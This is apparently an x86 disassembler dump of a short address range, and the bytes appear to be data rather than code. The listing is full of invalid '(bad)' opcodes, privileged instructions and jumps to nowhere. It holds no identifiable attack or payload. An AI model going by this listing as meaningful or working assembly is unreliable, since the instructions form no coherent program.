  4171c4:	icebp  
  4171c5:	jne    0x41715b
  4171c7:	leave  
  4171c8:	add    eax,DWORD PTR [ecx+0x3dbf85e]
  4171ce:	loopne 0x4171b7
  4171d0:	inc    eax
  4171d1:	cdq    
  4171d2:	push   ebx
  4171d3:	jl     0x417240
  4171d5:	call   0xf7b467e8
  4171da:	loop   0x4171c2
  4171dc:	int3   
  4171dd:	and    al,0xdb
  4171df:	adc    ebx,esi
  4171e1:	jle    0x4171e3
  4171e3:	mov    ebp,0xa09056e8
  4171e8:	int    0x81
  4171ea:	test   al,0xe1
  4171ec:	inc    edx
  4171ed:	mov    ch,0x29
  4171ef:	repnz mov gs,esp
  4171f2:	arpl   bx,bp
  4171f4:	mov    ecx,0xac330d3e
  4171f9:	rep ins BYTE PTR es:[edi],dx
  4171fb:	int3   
  4171fc:	test   DWORD PTR [edi],ebx
  4171fe:	in     eax,0xc0
  417200:	adc    dl,al
  417202:	inc    eax
  417203:	je     0x417276
  417205:	test   DWORD PTR [esi],esi
  417207:	mov    ebp,0xa1bd4818
  41720c:	or     eax,0xcc1e58bd
  417211:	sti    
  417212:	ret    0xdda5
  417215:	and    bl,dh
  417217:	xchg   edx,eax
  417218:	push   ss
  417219:	sbb    BYTE PTR [edi-0x7f],bh
  41721c:	and    al,0xfe
  41721e:	fwait
  41721f:	scas   eax,DWORD PTR es:[edi]
  417220:	pushf  
  417221:	jg     0x4171fd
  417223:	loopne 0x4171e2
  417225:	mov    ds:0xe3afb659,eax
  41722a:	add    eax,0x64fd0342
  41722f:	sub    al,0x1
  417231:	jl     0x417292
  417233:	lock inc ebp
  417235:	fst    DWORD PTR [ebx]
  417237:	fild   WORD PTR [ebx]
  417239:	rcl    BYTE PTR [edx+0xa0ef186],cl
  41723f:	inc    ecx
  417240:	adc    al,0xb9
  417242:	xchg   BYTE PTR [ecx+0x2c1e7079],bl
  417248:	stos   DWORD PTR es:[edi],eax
  417249:	data16 (bad) 
  41724b:	out    dx,eax
  41724c:	xor    al,0xaa
  41724e:	mov    eax,0x6ff18e14
  417253:	add    al,0xc7
  417255:	mov    ch,0x75
  417257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417258:	ins    DWORD PTR es:[edi],dx
  417259:	lahf   
  41725a:	mov    al,0xd2
  41725c:	pop    ebp
  41725d:	cmp    al,0xe2
  41725f:	push   esp
  417260:	movsx  eax,dx
  417263:	or     eax,0x4a209c05
  417268:	xchg   ebx,ebp
  41726a:	(bad)  
  41726b:	addr16 js 0x417292
  41726e:	dec    edx
  41726f:	nop
  417270:	popa   
  417271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417272:	leave  
  417273:	scas   eax,DWORD PTR es:[edi]
  417274:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417275:	ror    BYTE PTR [edx-0x38],1
  417278:	push   0x1dc3c49a
  41727d:	push   cs
  41727e:	into   
  41727f:	xor    al,0xe
  417281:	push   0x9af04b61
  417286:	ret    0x65ab
  417289:	xchg   BYTE PTR [edi],ah
  41728b:	call   0xc9e6:0x472b56d5
  417292:	push   ecx
  417293:	inc    esp
  417294:	jg     0x417273
  417296:	lahf   
  417297:	sbb    al,0x1e
  417299:	ja     0x4172aa
  41729b:	stc    
  41729c:	jno    0x417293
  41729e:	push   ecx
  41729f:	xchg   ecx,eax
  4172a0:	fst    DWORD PTR [esi+0x64f66b2b]
  4172a6:	mov    BYTE PTR [ebx-0x377d9639],ah
  4172ac:	inc    esi
  4172ad:	loopne 0x4172ec
  4172af:	dec    eax
  4172b0:	pop    esp
  4172b1:	mov    esi,0x673e7503
  4172b6:	test   eax,0x9660effa
  4172bb:	jnp    0x41732d
  4172bd:	cli    
  4172be:	jle    0x417279
  4172c0:	lods   al,BYTE PTR ds:[esi]
  4172c1:	fbld   TBYTE PTR [ebp+0x12989cd]
  4172c7:	mov    dl,BYTE PTR [eax-0x54]
  4172ca:	and    ecx,DWORD PTR [ebx+0x3b3ef9cc]
  4172d0:	sbb    eax,0x67c5174f
  4172d5:	fwait
  4172d6:	push   eax
  4172d7:	jge    0x417345
  4172d9:	add    ah,BYTE PTR [eax+0x10]
  4172dc:	push   esi
  4172dd:	xlat   BYTE PTR ds:[ebx]
  4172de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172df:	adc    DWORD PTR [ebx-0x4f2eb587],0xfffffff5
  4172e6:	mov    ecx,0xd4cd57d9
  4172eb:	dec    eax
  4172ec:	pusha  
  4172ed:	xchg   edx,eax
  4172ee:	lock xchg ecx,eax
  4172f0:	inc    ecx
  4172f1:	mov    al,0x89
  4172f3:	xor    ch,bl
  4172f5:	aaa    
  4172f6:	or     eax,DWORD PTR [ebx-0x10c74703]
  4172fc:	or     bl,BYTE PTR [eax+0x2845c8c8]
  417302:	mov    eax,0xcdfd2391
  417307:	jmp    DWORD PTR [eax-0x4c]
  41730a:	inc    edi
  41730b:	xor    eax,0x7008b659
  417310:	fidiv  DWORD PTR ds:0x228884c7
  417316:	sub    esp,DWORD PTR [eax+0x59]
  417319:	xchg   ebx,eax
  41731a:	xlat   BYTE PTR ds:[ebx]
  41731b:	sub    BYTE PTR [esi-0x19da464b],dh
  417321:	nop
  417322:	dec    ebx
  417323:	fwait
  417324:	mov    cl,0xce
  417326:	jo     0x41737d
  417328:	pop    edi
  417329:	or     al,0x8f
  41732b:	adc    edx,DWORD PTR [esi+0x79539f6c]
  417331:	pop    eax
  417332:	adc    eax,0x5c97e562
  417337:	pop    ds
  417338:	ins    DWORD PTR es:[edi],dx
  417339:	lahf   
  41733a:	inc    ebx
  41733b:	jmp    0x5fc5b3a2
  417340:	mov    ch,0x66
  417342:	dec    edx
  417343:	outs   dx,BYTE PTR ds:[esi]
  417344:	in     eax,dx
  417345:	nop
  417346:	mov    ah,0x4e
  417348:	fidivr WORD PTR [eax-0x22]
  41734b:	xor    ecx,DWORD PTR ds:[ecx+0x6a]
  41734f:	xchg   edi,eax
  417350:	leave  
  417351:	mov    al,ds:0x8909a12f
  417356:	dec    edi
  417357:	and    eax,0x354e3fac
  41735c:	mov    cl,0x72
  41735e:	dec    ecx
  41735f:	or     DWORD PTR [eax],0x6deeb828
  417365:	hlt    
  417366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417367:	inc    ecx
  417368:	and    ebp,DWORD PTR [esi-0x47b88a89]
  41736e:	xchg   edi,eax
  41736f:	and    eax,0x68745822
  417374:	xchg   esi,eax
  417375:	sub    eax,0x72f9858a
  41737a:	mov    eax,ds:0x4c5346d9
  41737f:	add    BYTE PTR [edx+eax*1+0x61d82533],ah
  417386:	(bad)  
  417387:	jp     0x417317
  417389:	pop    ds
  41738a:	imul   edi,DWORD PTR [ebx],0xffffffe2
  41738d:	sub    eax,0xf3682846
  417392:	loope  0x417326
  417394:	mov    ah,0x22
  417396:	dec    ecx
  417397:	fadd   DWORD PTR [ebp-0x6e]
  41739a:	or     al,0x0
  41739c:	clc    
  41739d:	add    DWORD PTR [ebp-0x4dea7648],0x20838fc8
  4173a7:	or     DWORD PTR ds:0x61efde54,ebx
  4173ad:	out    dx,al
  4173ae:	sub    ebp,DWORD PTR [edi+0x1630025]
  4173b4:	or     eax,0xa51db10
  4173b9:	cld    
  4173ba:	dec    ebp
  4173bb:	pop    esi
  4173bc:	sub    DWORD PTR [ebx-0x3d6850c0],ebp
  4173c2:	int3   
  4173c3:	mov    ds:0xf87500ee,eax
  4173c8:	call   0xf0ca9649
  4173cd:	mov    WORD PTR [ebp-0x5b],cs
  4173d0:	pop    ss
  4173d1:	sbb    BYTE PTR [ecx],dh
  4173d3:	div    dl
  4173d5:	and    eax,0x8a673782
  4173da:	sbb    DWORD PTR [eax+0x2b],ecx
  4173dd:	outs   dx,DWORD PTR ds:[esi]
  4173de:	gs fs jecxz 0x41737e
  4173e2:	loope  0x417377
  4173e4:	or     DWORD PTR [esi+0x37],ebp
  4173e7:	aam    0x49
  4173e9:	test   DWORD PTR [eax],0x21cd4830
  4173ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173f0:	add    DWORD PTR [eax+edx*8-0x7c77b50b],esi
  4173f7:	shl    bh,0xf3
  4173fa:	jge    0x417380
  4173fc:	mov    ds:0xc58b0c39,eax
  417401:	push   ebx
  417402:	cwde   
  417403:	jg     0x41739c
  417405:	lahf   
  417406:	xchg   ecx,eax
  417407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417408:	outs   dx,BYTE PTR ds:[esi]
  417409:	push   ss
  41740a:	pop    ebx
  41740b:	mov    bh,0x4
  41740d:	mov    ch,0x3f
  41740f:	dec    edi
  417410:	jb     0x417395
  417412:	cs loopne 0x41743c
  417415:	mov    ecx,0x98c8119b
  41741a:	dec    esp
  41741b:	xchg   edx,eax
  41741c:	fiadd  WORD PTR [edi+0xfdc1a71]
  417422:	popa   
  417423:	shl    al,1
  417425:	out    0x5e,al
  417427:	daa    
  417428:	mov    DWORD PTR [ebx-0x74],esp
  41742b:	lods   eax,DWORD PTR ds:[esi]
  41742c:	push   ds
  41742d:	mov    ecx,0xd747e4bf
  417432:	pop    ss
  417433:	mov    ah,0xef
  417435:	retf   0xbb42
  417438:	leave  
  417439:	outs   dx,BYTE PTR ds:[esi]
  41743a:	(bad)  
  41743b:	shr    DWORD PTR [esi],cl
  41743d:	mov    ch,dl
  41743f:	sbb    eax,0xa2c2b648
  417444:	std    
  417445:	popa   
  417446:	or     eax,0xdd39b061
  41744b:	lock fbld TBYTE PTR [edx-0x6b]
  41744f:	mov    al,0x9
  417451:	dec    ebp
  417452:	jl     0x4173fd
  417454:	adc    ebx,ebp
  417456:	and    al,0xc8
  417458:	inc    eax
  417459:	xchg   esp,eax
  41745a:	lods   eax,DWORD PTR ds:[esi]
  41745b:	sbb    BYTE PTR [edx-0x6b],dl
  41745e:	pop    ebp
  41745f:	call   0x65f3:0xe0d60476
  417466:	mov    eax,eax
  417468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417469:	mov    al,ds:0xf7ca458c
  41746e:	add    dh,BYTE PTR [edi+0x49]
  417471:	xlat   BYTE PTR ds:[ebx]
  417472:	add    DWORD PTR [esi],ebx
  417474:	xchg   esi,eax
  417475:	mov    BYTE PTR [ebx],ch
  417477:	dec    edi
  417478:	cmp    BYTE PTR [esi+0x3ce1f37f],ch
  41747e:	mov    eax,ds:0x399d3d6a
  417483:	xchg   edx,edx
  417485:	pop    ds
  417486:	pop    ecx
  417487:	sub    ch,dh
  417489:	out    dx,al
  41748a:	mov    ds:0x48d2d3,al
  41748f:	add    BYTE PTR [eax],al
  417491:	add    bh,bl
  417493:	dec    ebp
  417494:	call   0x305f:0xdfdf9a89
  41749b:	adc    al,0x61
  41749d:	retf   0x749d
  4174a0:	mov    dl,0xf3
  4174a2:	xor    edx,esi
  4174a4:	add    BYTE PTR [eax],al
  4174a6:	hlt    
  4174a7:	add    al,0x0
  4174a9:	add    BYTE PTR [ebx+0x46d5411d],bh
  4174af:	and    BYTE PTR [ecx-0x81696bc],dh
  4174b5:	xchg   ecx,eax
  4174b6:	mov    dl,0xd
  4174b8:	rol    DWORD PTR [eax-0x4a1e24e4],cl
  4174be:	pop    edx
  4174bf:	dec    edi
  4174c0:	clc    
  4174c1:	dec    esi
  4174c2:	stos   DWORD PTR es:[edi],eax
  4174c3:	pop    esi
  4174c4:	inc    esp
  4174c5:	xor    BYTE PTR [ecx+eax*2-0x74],0x36
  4174ca:	and    eax,0x4a64f262
  4174cf:	sbb    al,0x87
  4174d1:	mov    esi,0xac17d508
  4174d6:	mov    ds:0xf4cbebf1,al
  4174db:	pop    ss
  4174dc:	stc    
  4174dd:	sub    eax,0x2343284f
  4174e2:	push   cs
  4174e3:	mov    ah,0x8
  4174e5:	add    edi,DWORD PTR [eax+0x42ba9702]
  4174eb:	into   
  4174ec:	jge    0x417477
  4174ee:	mov    ch,0x67
  4174f0:	mov    ah,0x80
  4174f2:	jecxz  0x417518
  4174f4:	mov    DWORD PTR [esi+0x6cf8cdfd],ebp
  4174fa:	nop
  4174fb:	mov    ch,0x59
  4174fd:	pop    edi
  4174fe:	ja     0x4174ef
  417500:	gs dec eax
  417502:	je     0x417573
  417504:	inc    ecx
  417505:	aas    
  417506:	cld    
  417507:	test   BYTE PTR [eax-0x1664aad6],bl
  41750d:	and    eax,0x68ab1c8
  417512:	loope  0x417505
  417514:	data16 xor al,0x4
  417517:	and    BYTE PTR [edx+0x7d],0xc9
  41751b:	pop    esi
  41751c:	mov    cl,0x11
  41751e:	and    al,0xf2
  417520:	fistp  DWORD PTR [edi]
  417522:	lods   al,BYTE PTR ds:[esi]
  417523:	jecxz  0x41758d
  417525:	or     eax,0x59796b9a
  41752a:	icebp  
  41752b:	fdivr  DWORD PTR [ebp-0x554b5296]
  417531:	sar    BYTE PTR [ebx+0x4b4c1d38],0xe9
  417538:	sub    DWORD PTR [eax+0x29],0xffffff80
  41753c:	jg     0x41751f
  41753e:	es xor ch,ch
  417541:	lock pushf 
  417543:	ja     0x4175b1
  417545:	xchg   edi,eax
  417546:	xchg   edx,eax
  417547:	pushf  
  417548:	mov    ecx,0x48863927
  41754d:	adc    ebx,DWORD PTR [esi+eax*8+0x2c166b1e]
  417554:	adc    BYTE PTR [edi],al
  417556:	retf   
  417557:	out    dx,al
  417558:	sub    BYTE PTR [ebp-0x2e],al
  41755b:	inc    ebp
  41755c:	mov    bh,0x71
  41755e:	shl    BYTE PTR [ebp+ecx*2+0x61a25f9a],1
  417565:	in     al,dx
  417566:	test   DWORD PTR [edi],0x455759d9
  41756c:	sub    eax,0x356ecf47
  417571:	add    bh,ah
  417573:	inc    ecx
  417574:	adc    DWORD PTR [edx+0xe],ebp
  417577:	xor    BYTE PTR [edi-0x4e],0xfc
  41757b:	adc    ch,BYTE PTR [eax]
  41757d:	push   0x56b08496
  417582:	mov    ah,0xf2
  417584:	ret    0x3eb2
  417587:	ret    
  417588:	stos   BYTE PTR es:[edi],al
  417589:	sbb    bl,BYTE PTR [eax]
  41758b:	(bad)  
  41758c:	ins    DWORD PTR es:[edi],dx
  41758d:	xlat   BYTE PTR ds:[ebx]
  41758e:	fadd   st,st(4)
  417590:	add    BYTE PTR [eax+eax*1],cl
  417593:	fwait
  417594:	int    0xf4
  417596:	push   cs
  417597:	call   0x8002aae4
  41759c:	push   edx
  41759d:	xor    esi,ebp
  41759f:	cmp    ebp,DWORD PTR [ecx+0x55da56c2]
  4175a5:	imul   esp,DWORD PTR [edx],0x67
  4175a8:	mov    esp,0x67b2d04d
  4175ad:	lea    edx,[edi]
  4175af:	xchg   esp,edi
  4175b1:	pusha  
  4175b2:	cmc    
  4175b3:	aad    0x40
  4175b5:	loopne 0x417568
  4175b7:	cmp    BYTE PTR [esi],ah
  4175b9:	aas    
  4175ba:	mov    dl,0xe7
  4175bc:	jb     0x417588
  4175be:	add    eax,0xf7cd82f7
  4175c3:	and    eax,0x72e6ccf1
  4175c8:	inc    ebp
  4175c9:	sub    eax,0x99cbe19
  4175ce:	sbb    DWORD PTR [ebx],ebp
  4175d0:	fld    TBYTE PTR [esi+0x1e]
  4175d3:	lock cwde 
  4175d5:	ret    0xc43a
  4175d8:	fwait
  4175d9:	imul   edi,DWORD PTR [esi-0x16fe10f1],0xffffffcd
  4175e0:	ins    BYTE PTR es:[edi],dx
  4175e1:	jns    0x417567
  4175e3:	jo     0x4175f0
  4175e5:	out    0xcd,al
  4175e7:	pop    ds
  4175e8:	lea    eax,[ebp-0x1a]
  4175eb:	hlt    
  4175ec:	adc    eax,0xaf1b91f0
  4175f1:	jl     0x41765e
  4175f3:	pushf  
  4175f4:	shl    ah,cl
  4175f6:	imul   edx,eax,0xa2fdf859
  4175fc:	push   DWORD PTR [edi+0x23]
  4175ff:	popf   
  417600:	mov    edi,0x2ac023e
  417605:	out    0x72,eax
  417607:	xor    ch,bh
  417609:	ror    bh,cl
  41760b:	dec    ebx
  41760c:	outs   dx,BYTE PTR ds:[esi]
  41760d:	lock jns 0x4175d7
  417610:	pop    ebp
  417611:	add    edx,ebp
  417613:	mov    BYTE PTR [ebx],bh
  417615:	push   ebx
  417616:	xor    eax,0x9dba3e5d
  41761c:	cli    
  41761d:	adc    ch,dh
  41761f:	mov    ebx,esi
  417621:	cmp    al,0xb
  417623:	cs jb  0x417617
  417626:	test   eax,0x9bf34381
  41762b:	xchg   DWORD PTR [ecx],eax
  41762d:	and    bh,BYTE PTR [ebx]
  41762f:	imul   esp,DWORD PTR [ebp+0x497a4c8a],0x747b4f97
  417639:	sbb    esp,0xbcead831
  41763f:	and    DWORD PTR [ebx+0x2f],0x4ac3e681
  417646:	cmp    ebp,DWORD PTR [edi-0x2e]
  417649:	pop    eax
  41764a:	cmc    
  41764b:	mov    bl,0x97
  41764d:	add    DWORD PTR [edx-0x179eb4cc],ebp
  417653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417654:	jmp    0x41765e
  417656:	sub    esp,ebx
  417658:	and    al,0xbc
  41765a:	sbb    bl,BYTE PTR [eax]
  41765c:	adc    al,BYTE PTR [ebx+edx*2-0x28]
  417660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417661:	xlat   BYTE PTR ds:[ebx]
  417662:	push   edi
  417663:	scas   eax,DWORD PTR es:[edi]
  417664:	addr16 jns 0x417680
  417667:	or     ah,BYTE PTR [eax-0x37]
  41766a:	push   ds
  41766b:	pop    ebx
  41766c:	in     eax,dx
  41766d:	es sbb al,0xa0
  417670:	repz mov ah,0xba
  417673:	xchg   esp,eax
  417674:	out    dx,eax
  417675:	cmp    al,0x66
  417677:	into   
  417678:	arpl   WORD PTR [esp+edx*2],si
  41767b:	adc    bl,BYTE PTR [eax-0x72448041]
  417681:	jne    0x4176e3
  417683:	not    DWORD PTR [edi-0x475b7b84]
  417689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41768a:	add    dh,BYTE PTR [ebp-0x7658e093]
  417690:	cs adc eax,0xbd48f126
  417696:	(bad)  
  417697:	cmp    BYTE PTR [ebp-0x14],ch
  41769a:	xor    al,dh
  41769c:	and    BYTE PTR [esi-0x12],0xa9
  4176a0:	jl     0x4176e9
  4176a2:	sti    
  4176a3:	push   esi
  4176a4:	push   ecx
  4176a5:	bound  edi,QWORD PTR [edx]
  4176a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176a8:	fbstp  TBYTE PTR [ebx+esi*4+0xf]
  4176ac:	mov    edi,0x35e1cd3f
  4176b1:	jns    0x417658
  4176b3:	push   ecx
  4176b4:	mov    ebp,0xdab1f171
  4176b9:	mov    cr6,ebx
  4176bc:	shl    ah,0xa9
  4176bf:	mov    ah,0xdc
  4176c1:	dec    ebx
  4176c2:	fidivr WORD PTR [edx]
  4176c4:	in     al,0xc3
  4176c6:	adc    edx,DWORD PTR [ecx+eiz*4]
  4176c9:	popa   
  4176ca:	push   ebx
  4176cb:	xchg   ecx,eax
  4176cc:	bnd jl 0x417727
  4176cf:	in     al,dx
  4176d0:	mov    cl,BYTE PTR [edx]
  4176d2:	mov    al,0xc7
  4176d4:	add    edx,DWORD PTR [ebx]
  4176d6:	xor    dh,BYTE PTR [ecx-0x19ee9857]
  4176dc:	pop    ss
  4176dd:	adc    al,0x4a
  4176df:	jmp    0x4485:0x74ba0f4f
  4176e6:	test   al,0x71
  4176e8:	fld    DWORD PTR [eax+0x27bee360]
  4176ee:	add    dl,BYTE PTR [ebx+0x2769a84b]
  4176f4:	fiadd  DWORD PTR fs:[ebx+ebp*2+0x45817f84]
  4176fc:	inc    esi
  4176fd:	lea    eax,[ebx]
  4176ff:	hlt    
  417700:	dec    ebp
  417701:	xor    al,0x65
  417703:	loope  0x417748
  417705:	test   ebp,0xb5e39be2
  41770b:	pop    ebx
  41770c:	in     eax,dx
  41770d:	adc    al,0x78
  41770f:	xchg   ebp,eax
  417710:	scas   al,BYTE PTR es:[edi]
  417711:	in     eax,0x9b
  417713:	les    ecx,FWORD PTR [ebp-0x39ecc780]
  417719:	mov    BYTE PTR [edi],ah
  41771b:	lods   eax,DWORD PTR ds:[esi]
  41771c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41771d:	test   edi,edi
  41771f:	bound  edx,QWORD PTR [ebp-0x4b]
  417722:	sub    eax,0xc56aee62
  417727:	jae    0x417701
  417729:	cwde   
  41772a:	out    0xcf,eax
  41772c:	pushf  
  41772d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41772e:	test   DWORD PTR [edi],0x91c58aef
  417734:	dec    edi
  417735:	inc    edx
  417736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417737:	ret    0xd41f
  41773a:	mov    bh,dh
  41773c:	fdiv   st(6),st
  41773e:	test   BYTE PTR ds:0x27bfb77d,bl
  417744:	jmp    0xcf2b:0x9e48c3f9
  41774b:	mov    bl,0x16
  41774d:	add    al,0x1c
  41774f:	jno    0x4177a7
  417751:	jnp    0x417788
  417753:	push   esi
  417754:	gs push edi
  417756:	push   ecx
  417757:	lahf   
  417758:	mul    DWORD PTR [ecx-0x14281322]
  41775e:	xchg   edx,eax
  41775f:	sub    eax,0xd3cdc7bf
  417764:	xchg   ecx,eax
  417765:	imul   ah
  417767:	inc    esi
  417768:	cmc    
  417769:	aad    0x19
  41776b:	and    ebp,DWORD PTR [ecx-0x650b6ce5]
  417771:	jns    0x4177a3
  417773:	retf   0xc542
  417776:	add    al,0xed
  417778:	ds jne 0x417734
  41777b:	add    al,0x46
  41777d:	call   0xf797a13
  417782:	jbe    0x41775b
  417784:	xchg   edi,eax
  417785:	pop    esp
  417786:	push   ecx
  417787:	cmp    BYTE PTR [edx],bh
  417789:	lahf   
  41778a:	fs mov dl,0x9e
  41778d:	in     eax,0xf8
  41778f:	(bad)  
  417791:	push   es
  417792:	and    dh,BYTE PTR [esp+esi*8-0x8]
  417796:	fistp  WORD PTR [edi+0x6564eb1a]
  41779c:	push   eax
  41779d:	sahf   
  41779e:	rcr    BYTE PTR [edx-0x3772ad1a],1
  4177a4:	adc    ebx,DWORD PTR [ebx-0xa4bf13e]
  4177aa:	jbe    0x417816
  4177ac:	fwait
  4177ad:	lea    esi,[edi+0x6a]
  4177b0:	sub    edi,DWORD PTR [esi+0x66]
  4177b3:	inc    ebp
  4177b4:	sub    DWORD PTR [edi-0xf9ef31b],edx
  4177ba:	retf   
  4177bb:	test   al,0x32
  4177bd:	arpl   WORD PTR [edi+eiz*8],di
  4177c0:	sahf   
  4177c1:	out    dx,al
  4177c2:	mov    eax,0x8e9044f1
  4177c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177c8:	pop    ebp
  4177c9:	xchg   ecx,eax
  4177ca:	enter  0x300e,0xf4
  4177ce:	jl     0x417835
  4177d0:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4177d2:	xchg   edi,eax
  4177d3:	mov    ecx,0x37462db0
  4177d8:	xor    bh,BYTE PTR [edi]
  4177da:	mov    bh,0xd0
  4177dc:	push   ss
  4177dd:	inc    eax
  4177de:	int3   
  4177df:	ins    BYTE PTR es:[edi],dx
  4177e0:	mov    eax,ds:0x8bb63ef0
  4177e5:	cmp    eax,0xb30e04e4
  4177ea:	addr16 xor al,0x3c
  4177ed:	push   ss
  4177ee:	xchg   BYTE PTR [ebp+0x3c],cl
  4177f1:	lahf   
  4177f2:	in     al,dx
  4177f3:	scas   al,BYTE PTR es:[edi]
  4177f4:	and    edi,0xe7753a16
  4177fa:	mov    bh,0x9e
  4177fc:	pop    esp
  4177fd:	fdiv   st,st(3)
  4177ff:	dec    esi
  417800:	lea    eax,[edi+0x45]
  417803:	inc    esi
  417804:	repz xor BYTE PTR [edx-0x1c],0x49
  417809:	or     BYTE PTR [edi],ah
  41780b:	fisttp WORD PTR [ecx+0x7b]
  41780e:	(bad)  
  41780f:	les    edi,FWORD PTR [ecx+ecx*8+0x64]
  417813:	push   ss
  417814:	mov    WORD PTR [edx+0x6e],?
  417817:	jmp    0xb53d:0xceb3e8f2
  41781e:	or     dh,BYTE PTR [edx+0x689a45c7]
  417824:	(bad)  
  417825:	push   eax
  417826:	stos   BYTE PTR es:[edi],al
  417827:	cmp    al,0x68
  417829:	imul   ecx,DWORD PTR [esp+eax*2-0xd],0x9ceba2e0
  417831:	adc    dl,al
  417833:	mov    esi,0xd8394463
  417838:	adc    al,cl
  41783a:	test   al,0xbd
  41783c:	mov    esi,0xcb181f6d
  417841:	xor    al,0xf9
  417843:	dec    esi
  417844:	push   DWORD PTR [ecx]
  417846:	xlat   BYTE PTR ds:[ebx]
  417847:	arpl   WORD PTR [ecx+0x33ddd351],dx
  41784d:	sbb    al,BYTE PTR [ebp+0x7e5351d1]
  417853:	(bad)  
  417854:	fs xchg ebp,eax
  417856:	mov    edx,DWORD PTR [edi]
  417858:	cmp    al,0x55
  41785a:	outs   dx,DWORD PTR ds:[esi]
  41785b:	jb     0x417848
  41785d:	imul   ebp,DWORD PTR [ebx+0x31],0x74
  417861:	rcr    BYTE PTR [ebx+0x4ee27c7f],1
  417867:	(bad)  
  417869:	cmp    esi,DWORD PTR [eax]
  41786b:	cmp    esi,DWORD PTR [ecx-0x1]
  41786e:	and    al,0xa4
  417870:	jmp    0x86abe319
  417875:	rol    DWORD PTR [esi],0x3
  417878:	pop    es
  417879:	int3   
  41787a:	lods   eax,DWORD PTR ds:[esi]
  41787b:	mov    ch,0x2a
  41787d:	fcmovbe st,st(3)
  41787f:	and    DWORD PTR [ebx-0x6e],edi
  417882:	mov    bh,0x86
  417884:	or     BYTE PTR [ebx+0x1eb830d5],ch
  41788a:	mov    cl,0xc4
  41788c:	xchg   esi,eax
  41788d:	dec    ebp
  41788e:	mov    ebp,0xc1361d81
  417893:	jge    0x4178ca
  417895:	daa    
  417896:	fnstenv [edx-0x3528b5fb]
  41789c:	sbb    BYTE PTR [edi+0x2632c202],dl
  4178a2:	push   es
  4178a3:	test   BYTE PTR [eax-0x5beec135],ah
  4178a9:	jge    0x417849
  4178ab:	outs   dx,BYTE PTR ds:[esi]
  4178ac:	aam    0x63
  4178ae:	retf   0x3325
  4178b1:	(bad)  
  4178b2:	push   ds
  4178b3:	mov    ebx,0x16702c6e
  4178b8:	and    edx,DWORD PTR [eax-0x481fcea]
  4178be:	leave  
  4178bf:	inc    ebp
  4178c0:	leave  
  4178c1:	lahf   
  4178c2:	mov    eax,ds:0x30190e8e
  4178c7:	aam    0x17
  4178c9:	xchg   esp,eax
  4178ca:	inc    edi
  4178cb:	es mov ebp,0x636694c7
  4178d1:	jns    0x417924
  4178d3:	pusha  
  4178d4:	aaa    
  4178d5:	cmp    al,0x21
  4178d7:	or     DWORD PTR [edx],0xbb7b7c54
  4178dd:	pop    ss
  4178de:	outs   dx,DWORD PTR ds:[esi]
  4178df:	sub    DWORD PTR [esi],0x2052b0e0
  4178e5:	dec    BYTE PTR [ebx+0x489832fe]
  4178eb:	mov    al,ds:0xe6ad7c1f
  4178f0:	pop    esi
  4178f1:	jnp    0x4178a8
  4178f3:	mov    ebx,0x84de02
  4178f8:	mov    WORD PTR [esi-0x56],cs
  4178fb:	and    dl,ah
  4178fd:	push   esp
  4178fe:	cmp    DWORD PTR [ecx+ebx*1-0x46],eax
  417902:	sahf   
  417903:	cmp    eax,0xfcfe0931
  417908:	add    eax,0x5c8c689b
  41790d:	dec    esi
  41790e:	(bad)  
  41790f:	dec    esi
  417910:	or     eax,0xfbc24fa0
  417915:	(bad)  
  417916:	loope  0x417976
  417918:	or     ah,BYTE PTR [edi+0x20]
  41791b:	pop    ebp
  41791c:	das    
  41791d:	ficom  DWORD PTR [ecx]
  41791f:	fwait
  417920:	imul   ebx,ebp,0x32
  417923:	sbb    al,0xae
  417925:	ds addr16 ret 
  417928:	in     eax,dx
  417929:	hlt    
  41792a:	mov    al,ds:0xc67917de
  41792f:	push   DWORD PTR [esi]
  417931:	fisubr WORD PTR [edi]
  417933:	aaa    
  417934:	lahf   
  417935:	mov    ss,esp
  417937:	sub    esi,DWORD PTR [ebx]
  417939:	leave  
  41793a:	pop    ebx
  41793b:	imul   ebp,DWORD PTR [ebx+0x268d75c9],0xffffffa8
  417942:	xchg   ebx,eax
  417943:	jl     0x4179b2
  417945:	dec    eax
  417946:	out    0xd,al
  417948:	loop   0x417968
  41794a:	std    
  41794b:	push   ds
  41794c:	sbb    esp,DWORD PTR [ecx-0x43]
  41794f:	lods   eax,DWORD PTR ds:[esi]
  417950:	ds xchg edi,eax
  417952:	jg     0x4179cb
  417954:	inc    edi
  417955:	fs addr16 cdq 
  417958:	push   esi
  417959:	xor    DWORD PTR [ecx+0x68af646b],edi
  41795f:	and    BYTE PTR [ebx+0x563bab6c],cl
  417965:	pop    es
  417966:	aam    0x99
  417968:	bound  ecx,QWORD PTR [ebx+eax*8]
  41796b:	test   eax,0x6031a2cd
  417970:	or     DWORD PTR ds:0x254fc4de,edx
  417976:	inc    ebp
  417977:	dec    DWORD PTR [edi]
  417979:	jge    0x417963
  41797b:	or     edi,DWORD PTR [esp+ebx*8-0x63]
  41797f:	int    0xcb
  417981:	out    0x14,al
  417983:	loope  0x417944
  417985:	sub    eax,0x96c6995f
  41798a:	retf   0xc404
  41798d:	push   esp
  41798e:	(bad)  
  417990:	cmp    dh,BYTE PTR [ecx-0x11]
  417993:	cli    
  417994:	add    ebx,eax
  417996:	mov    dl,0x2a
  417998:	loopne 0x417984
  41799a:	ret    
  41799b:	aad    0x5a
  41799d:	and    al,0x0
  41799f:	add    BYTE PTR [eax],al
  4179a1:	add    BYTE PTR [esi],ah
  4179a3:	mov    ah,0x71
  4179a5:	jno    0x41799a
